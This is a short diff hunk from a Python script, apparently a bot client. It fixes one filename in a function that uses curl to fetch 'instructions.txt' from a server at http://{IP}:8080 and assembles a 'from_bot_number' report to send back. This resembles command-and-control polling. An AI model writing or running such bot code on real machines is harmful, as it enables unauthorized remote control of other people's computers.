@@ -61,7 +61,7 @@ def instructions():
 	os.chdir(dir)
 	os.system('curl http://{IP}:8080/instructions.txt > response.txt')
 	os.system("echo 'from_bot_number:' > sendthis.txt && cat name.txt >> sendthis.txt")
-	os.system("cat names.txt >> sendthis.txt")
+	os.system("cat name.txt >> sendthis.txt")
 	os.system("echo ':' >> sendthis.txt")
 	with open('response.txt') as input_file:
 		myname = open('name.txt', 'r').read()
